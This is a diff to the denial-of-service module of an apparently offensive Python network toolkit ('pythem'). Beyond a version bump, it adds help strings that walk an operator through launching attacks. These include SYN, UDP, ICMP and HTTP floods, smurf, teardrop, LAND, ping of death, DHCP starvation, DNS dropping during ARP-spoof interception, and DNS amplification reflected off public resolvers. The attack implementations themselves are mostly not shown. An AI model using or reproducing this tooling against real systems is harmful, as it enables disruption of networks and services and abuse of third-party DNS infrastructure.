@@ -21,7 +21,6 @@
 from netfilterqueue import NetfilterQueue
 from scapy.all import *
 import os
-import socket
 import sys
 import threading
 import requests
@@ -30,8 +29,8 @@ import requests
 class DOSer(object):
     name = "Denial of Service Module."
     desc = "Denial of service attacks here."
-    version = "1.2"
-    ps = "Need to add POST DoS attack."
+    version = "1.3"
+    ps = "Need to add POST HTTP DoS attack."
 
     def __init__(self):
         self.blocks = []
@@ -189,6 +188,7 @@ class DOSer(object):
         except Exception as e:
             print "[!] Error: {}".format(e)
 
+
     def teardrop(self, target):
         # First packet
         try:
@@ -313,3 +313,114 @@ class DOSer(object):
             exit(0)
         except Exception as e:
             pass
+
+
+dos_help = """\n
+[Help] Start to perform a choosen denial of service in target.
+[Required] Depends
+parameters:
+  - land
+  - dnsdrop
+  - synflood
+  - udpflood
+  - teardrop
+  - icmpflood
+  - icmpsmurf
+  - dhcpstarvation
+  - dnsamplification
+  - httpflood
+  - pingofdeath
+example:
+pythem> dos icmpsmurf help
+\n"""
+
+teardrop_help="""\n
+[Help] Start an UDP teardrop fragmentation attack.
+[Required] Target and interface
+example:
+pythem> set interface wlan0
+pythem> set target 192.168.0.6
+pythem> dos teardrop
+\n"""
+
+icmpsmurf_help="""\n
+[Help] Start a ICMP smurf attack on target host. send echo-requests with spoofed target address.
+[Required] Target and interface
+example:
+pythem> set target 192.168.1.4
+pythem> set interface wlan0
+pythem> dos icmpsmurf
+\n"""
+
+synflood_help="""\n
+[Help] Start a SYN flood attack on target host, default port = 80, set port to change.
+[Required] Target and interface
+[Optional] port
+example:
+pythem> set target 192.168.1.4
+pythem> set interface wlan0
+pythem> dos synflood
+\n"""
+
+udpflood_help="""\n
+[Help] Start a UDP flood attack on target host, default port = 80, set port to change.
+[Required] Target
+[Optional] port
+example:
+pythem> set target 192.168.1.4
+pythem> dos synflood
+\n"""
+
+dnsdrop_help="""\n
+[Help] Start to drop DNS queries that pass through man-in-the-middle traffic.
+[Required] ARP spoof started
+example:
+pythem> dos dnsdrop
+\n"""
+
+icmpflood_help="""\n
+[Help] Start a ICMP flood attack on target host.
+[Required] Target and interface
+example:
+pythem> set target 10.0.0.1
+pythem> set interface wlan0
+pythem> dos icmpflood
+\n"""
+
+dhcpstarvation_help="""\n
+[Help] Start a DHCP starvation attack on network DHCP server. Multiple spoofed mac dhcp discovers.
+example:
+pythem> dos dhcpstarvation
+\n"""
+
+httpflood_help="""\n
+[Help] Start a HTTP request flood on a target URL, *Only GET method supported by now.
+example:
+pythem> set target http://localhost/
+pythem> dos httpflood
+\n"""
+
+land_help="""\n
+[Help] Start a LAND attack on a target.
+[Required] Target
+[Optional] Port, default = 80
+example:
+pythem> set target 10.0.0.101
+pythem> dos land
+\n"""
+
+pingofdeath_help="""\n
+[Help] Start a Ping of Death attack on a target.
+[Required] Target
+example:
+pythem> set target 192.168.1.101
+pythem> dos pingofdeath
+\n"""
+
+dnsamplification_help="""\n
+[Help] Start a DNS amplification attack on target address with given DNS servers to amplificate.
+example:
+pythem> set target 1.2.3.4
+pythem> dos dnsamplification
+[+] DNS Server to use in amplification attack(separated by commas): 8.8.8.8,8.8.4.4
+\n"""
